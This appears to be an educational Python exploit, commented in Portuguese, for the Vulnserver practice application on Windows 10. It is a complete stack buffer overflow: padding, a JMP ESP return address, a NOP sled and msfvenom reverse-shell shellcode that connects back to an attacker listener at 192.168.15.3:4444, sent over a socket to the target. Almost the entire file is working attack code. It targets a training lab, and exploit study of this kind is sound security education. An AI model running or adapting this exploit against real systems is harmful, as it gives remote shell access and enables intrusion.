# EXPLOIT DIDÁTICO EM PYTHON3 PARA EXPLORAR O VULNSERVER (NETSERVER) RODANDO NO WINDOWS 10 ENTERPRISE (X64)
# https://github.com/stephenbradshaw/vulnserver

#!/usr/bin/python
import socket

# ENDEREÇO DO JMP ESP:
# 0x625012a0 - netserver.dll
# BAD CHAR:
# \x00

# FAZ CONEXÃO REVERSA PARA 192.168.15.3:4444
# USANDO MSFVENON PARA GERAR O MESMO PAYLOAD: "msfvenom -p windows/shell_reverse_tcp lhost=192.168.15.3 lport=4444 exitfunc=thread -b "\x00" -f c"
shellcode = b"\xda\xd8\xb8\xf0\xbc\x64\xae\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1\x52\x83\xef\xfc\x31\x47\x13\x03\xb7\xaf\x86\x5b\xcb\x38\xc4\xa4\x33\xb9\xa9\x2d\xd6\x88\xe9\x4a\x93\xbb\xd9\x19\xf1\x37\x91\x4c\xe1\xcc\xd7\x58\x06\x64\x5d\xbf\x29\x75\xce\x83\x28\xf5\x0d\xd0\x8a\xc4\xdd\x25\xcb\x01\x03\xc7\x99\xda\x4f\x7a\x0d\x6e\x05\x47\xa6\x3c\x8b\xcf\x5b\xf4\xaa\xfe\xca\x8e\xf4\x20\xed\x43\x8d\x68\xf5\x80\xa8\x23\x8e\x73\x46\xb2\x46\x4a\xa7\x19\xa7\x62\x5a\x63\xe0\x45\x85\x16\x18\xb6\x38\x21\xdf\xc4\xe6\xa4\xfb\x6f\x6c\x1e\x27\x91\xa1\xf9\xac\x9d\x0e\x8d\xea\x81\x91\x42\x81\xbe\x1a\x65\x45\x37\x58\x42\x41\x13\x3a\xeb\xd0\xf9\xed\x14\x02\xa2\x52\xb1\x49\x4f\x86\xc8\x10\x18\x6b\xe1\xaa\xd8\xe3\x72\xd9\xea\xac\x28\x75\x47\x24\xf7\x82\xa8\x1f\x4f\x1c\x57\xa0\xb0\x35\x9c\xf4\xe0\x2d\x35\x75\x6b\xad\xba\xa0\x3c\xfd\x14\x1b\xfd\xad\xd4\xcb\x95\xa7\xda\x34\x85\xc8\x30\x5d\x2c\x33\xd3\xa2\x19\x34\x20\x4b\x58\x4a\x37\xd7\xd5\xac\x5d\xf7\xb3\x67\xca\x6e\x9e\xf3\x6b\x6e\x34\x7e\xab\xe4\xbb\x7f\x62\x0d\xb1\x93\x13\xfd\x8c\xc9\xb2\x02\x3b\x65\x58\x90\xa0\x75\x17\x89\x7e\x22\x70\x7f\x77\xa6\x6c\x26\x21\xd4\x6c\xbe\x0a\x5c\xab\x03\x94\x5d\x3e\x3f\xb2\x4d\x86\xc0\xfe\x39\x56\x97\xa8\x97\x10\x41\x1b\x41\xcb\x3e\xf5\x05\x8a\x0c\xc6\x53\x93\x58\xb0\xbb\x22\x35\x85\xc4\x8b\xd1\x01\xbd\xf1\x41\xed\x14\xb2\x62\x0c\xbc\xcf\x0a\x89\x55\x72\x57\x2a\x80\xb1\x6e\xa9\x20\x4a\x95\xb1\x41\x4f\xd1\x75\xba\x3d"

# 2007 BYTES PARA SOBRESCREVER O EAX
# 4 BYTES PARA SOBRESCREVER O EIP (ESCRITO EM LITTLE ENDIAN)
# 32 NO-OPERATIONS
# SHELLCODE
dados = b"\x41" * 2007 + b"\xa0\x12\x50\x62" + b"\x90" * 32 + shellcode

# MONTA O SOCKET
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# CONECTA
s.connect(("192.168.15.10",5800))
s.recv(1024)
# ENVIA O COMANDO
s.send(("SEND ").encode()+dados+("\r\n").encode())
